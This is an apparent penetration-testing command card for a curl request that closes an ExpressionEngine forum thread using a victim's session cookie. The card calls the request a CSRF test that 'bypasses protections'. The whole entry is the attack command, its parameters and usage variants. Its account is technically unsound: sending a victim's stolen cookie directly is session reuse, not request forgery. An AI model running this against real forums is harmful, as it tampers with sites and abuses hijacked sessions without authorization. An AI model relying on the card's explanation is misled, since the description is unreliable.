---
data: >-
  curl -X GET "http://target.com/forum/thread_close/123" -H "Cookie:
  exp_sessionid=valid_session; other_cookies"
tags:
  - csrf
  - web
  - test
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 1e76db05-9efc-48fc-8a91-7e68a507b811
created_at: '2025-12-14T17:27:42.907Z'
updated_at: '2025-12-14T17:27:42.907Z'
verified: false
validated: true
submitted: true
---
# curl-csrf-test-close

## Command

```bash
curl -X GET "http://target.com/forum/thread_close/123" -H "Cookie: exp_sessionid=valid_session; other_cookies"
```

## Description

This command tests CSRF by forging a GET request to close a forum thread in ExpressionEngine, bypassing protections to alter thread status.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies HTTP GET method | Yes |
| `"http://target.com/forum/thread_close/123"` | Target endpoint with thread ID (replace 123) | Yes |
| `-H "Cookie: ..."` | Victim's session cookies | Yes for testing |

## Examples

### Basic Usage

```bash
curl -X GET "http://target.com/forum/thread_close/123" -H "Cookie: exp_sessionid=abc123"
```

### Advanced Usage

```bash
curl -X GET "http://target.com/forum/thread_close/123" -H "Cookie: exp_sessionid=abc123" -v -L
```

Use -L to follow redirects.

## Expected Output

HTTP 200 OK response confirming closure; check forum to verify status change.

## Related

- [[Related Procedure: Exploit-CSRF-to-Manipulate-Forum-Threads]]
